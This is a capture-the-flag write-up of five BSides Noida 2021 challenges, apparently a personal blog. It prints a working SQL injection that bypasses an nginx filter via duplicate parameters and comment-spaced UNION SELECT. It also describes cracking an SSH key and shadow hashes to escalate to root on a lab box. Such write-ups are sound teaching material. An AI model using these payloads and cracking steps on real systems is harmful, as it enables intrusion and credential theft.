# BSides Noida CTF 2021

This was a CTF I participated hosted by DarkArmy from 07 Aug 2021, 16:00 IST to 08 Aug 2021, 16:00 IST and our team **Byt3Scr4pp3rs** placed 32nd overall.

# Baby Web

#### Category : Web
#### Points : 420 (68 solves)
#### Author : Karma

## Problem
Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD
Note : Bruteforce is not required.

[Link](http://ctf.babyweb.bsidesnoida.in/)

[Sauce](https://storage.googleapis.com/noida_ctf/Web/baby_web.zip)

## Solution

Downloading the source and hosting it in a docker locally, we see that this website takes a parameter `chall_id`

![baby web site](/BSNoida_baby_web_site.png)

Looking at the `index.php` file, we see that the following sql query is being executed.

![](/BSNoida_sql_query.png)

But if we try to put an alphabet in the parameter `chall_id`, we get an error.

![](/BSNoida_baby_web_error.png" height="50%" width="50%)

Looking at `config/ctf.conf` in the source code, there is some regex that is used to prevent alphabets and white spaces.

![](/BSNoida_baby_web_regex.png)

To bypass this we can use two parameters so that first one is processed by nginx and second one bypasses it.

```html
GET /?chall_id=1&chall_id=a
```

![](/BSNoida_nginx_bypass.png)

And to bypass the white space restriction we can use comments.

So instead of  `UNION SELECT`, we use `UNION/**/SELECT`

### Listing columns and tables
From opening `karma.db`(from source code) in sqlite browser, we see that it has 6 columns.

To list columns and tables, I used the following payload

```html
GET /?chall_id=1&chall_id=1/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,sql/**/FROM/**/sqlite_master
```

Using this payload we get a table named `flagsss` and column named `flag`

![](/BSNoida_getting_tables_columns.png)

Now, we can use the following query to retrieve the flag.

```html
GET /?chall_id=1&chall_id=1/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,flag/**/FROM/**/flagsss
```

![](/BSNoida_flag_query.png)

So the flag is `BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4}`

# Death Note

#### Category : Death Note
#### Points : 454 (43 solves)
#### Author : Mr.Grep

## Challenge
CTF Box based on Death Note
Note : submit the root flag

[chall link](https://tryhackme.com/jr/bsidesnoida2021ctfn6)

## Solution
#### Nmap Scan
Scanning for ports, we see that there are only 2 ports open : 22 and 80.

#### Directory scan
Scanning for directories with the given [wordlst](https://github.com/p1xxxel)

```bash
index.html              [Status: 200, Size: 4173, Words: 1633, Lines: 104]
s3cr3t                  [Status: 200, Size: 63, Words: 12, Lines: 2]
robots.txt              [Status: 200, Size: 17, Words: 3, Lines: 2]
ryuk.apples             [Status: 200, Size: 1766, Words: 9, Lines: 31]
robots.txt              [Status: 200, Size: 17, Words: 3, Lines: 2]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 148 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

At `ryuk.apples`, there is a ssh private key but it has a passphrase.

![](/BSNoida_ryuk_ssh_passphrase.png)

#### Cracking ssh key
We can use `ssh2john` and then crack it with john using the given wordlist.
![](/BSNoida_cracking_ssh_key.png)

Now we can use this to login as `ryuk`

#### Cracking shadow
We see in ryuk's home directory there is shadow and passwd. 
![](/BSNoida_ryuk_shadow.png)

Using them, we get the password of `light`
![](/BSNoida_cracking_shadow.png)

#### Getting flag
Doing a `sudo -l`, we can run `cat` as root so we can just cat the flag at `/root/root.txt`

![](/BSNoida_getting_flag.png)

So the flag is `BSNoida{Pr1vEsc_w4a_E4sy_P3a5y}`

# My Artwork

#### Category : Misc
#### Points : 287 (149 solves)
#### Author : rey

## Challenge

"You can create art and beauty with a computer." - Steven Levy
So, I decided not to use MS Paint anymore and write code instead!
Hope you can see my art before the turtle runs away!
He's pretty fast tbh!
PS: Put the flag in BSNoida{} wrapper.

Attachment : art.TURTLE

![](/BSNoida_chal_commands.png)

Looking at the commands and searching them I find that they are syntax of MSW Logo so I download MSW Logo and execute the repeat commands one by one.

![](/BSNoida_exec_logo_commands.png)

Doing so we get 
```bash
CODE_IS_BEAUTY_BEAUTY_IS_CODE
```

So our flag becomes
```bash
BSNoida{CODE_IS_BEAUTY_BEAUTY_IS_CODE}
```

# Sanity

#### Category : Reverse
#### Points : 437 (56 solves)
#### Author : 1gn1te

## Challenge
```bash
strings Sanity.exe | grep BS | cut -d'{' -f2 | cut -d'}' -f1 | while read l;do echo $l | base64 -d ;done
```

[chall link](https://storage.googleapis.com/noida_ctf/Reverse/Sanity.zip)

## Solution
Using the command given in the challenge we get lyrics of Rickroll.

Opening the exe in ghidra, we see that it XORs each character and then compares it.

![](/BSNoida_ghidra_decompilation.png)

Opening the binary in Ollydbg and setting the breakpoint at the `CMP` instruction using `F2`.

![](/BSNoida_ollydbg_breakpoint.png)

The flag length is 33 as this was the length of the string getting XORed with input(from ghidra).

We send 33 A's and then look at the CMP instruction.

![](/BSNoida_CMP_instruction.png)

So A gets converted into H and then is compared to K. So we can just XOR A with H to get the key and then XOR the key with K to get the flag.

So I note down the encrypted key and the encrypted string and make the following solve script.

```python
from pwn import xor
payload = 'A'*33
cipher = 'HeHeBoiiHeHeBoiiHeHeBoiiHeHeBoiiH'
enc_key = 'KwGKjJISL^s^yTRRs^s^yTRRs^s{EBIOt'
flag = ''
for i in range(0,33):
    flag = flag + xor(xor(enc_key[i],payload[i]),cipher[i]).decode('ascii')
print(flag)
```

Using this script, we get the flag `BSNoida{Ezzzzzzzzzzzzzzzzzz_Flag}`

# Xoro

#### Category : Crypto
#### Points : 380 (89 solves)
#### Author : rey

## Challenge


"You need to accept the fact that you’re not the best and have all the will to strive to be better than anyone you face." – Roronoa Zoro

Connection : `nc 104.199.9.13 1338`

Attachment : xoro.py

## Solution

From the python file we see that it takes some hex input, converts it into bytes, concatenates with the flag bytes and then XORs it with a randomly generated and padded key originally of length 32.

```python
def pad(text, size):
    return text*(size//len(text)) + text[:size%len(text)]
```

As the key is of 32 characters and then it gets padded by the above function, if we input our own 32 characters, we can then XOR the result we get with the characters we sent, to get the key.

```bash
# nc 104.199.9.13 1338                                                                           ─╯

===== WELCOME TO OUR ENCRYPTION SERVICE =====

[plaintext (hex)]>  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ciphertext (hex)]> 03dbb4aa7bafbdf8c2ba096da1a4868011f49fbb54dd97778749af3266063e2feb22506fb8617629007fd498686f4275c231404e9c0558bc46bc51d089f3cccafb2e2121ee246a
See ya ;)
```

I input 64 A's (2 hex characters = 1 byte) and get the above as cipher text.

I then XOR the payload(bytes from 64 A's) and the first 32 bytes from cipher text, to get the key.

```python
>>> from pwn import xor
>>> cipher = '03dbb4aa7bafbdf8c2ba096da1a4868011f49fbb54dd97778749af3266063e2feb22506fb8617629007fd498686f4275c231404e9c0558bc46bc51d089f3cccafb2e2121ee246a'
>>> key = xor(bytes.fromhex(cipher)[0:32],bytes.fromhex("A"*64))
>>> key
b'\xa9q\x1e\x00\xd1\x05\x17Rh\x10\xa3\xc7\x0b\x0e,*\xbb^5\x11\xfew=\xdd-\xe3\x05\x98\xcc\xac\x94\x85'
```

Now, we can just xor the original cipher text and the key to get the flag.

```python
>>> xor(bytes.fromhex(cipher),key)[32:]
b'BSNoida{how_can_you_break_THE_XOR_?!?!}'
```

So the flag is `BSNoida{how_can_you_break_THE_XOR_?!?!}`

Note : If you use the XOR function from the script, you will first need to pad the key to be of the same lenght as cipher.
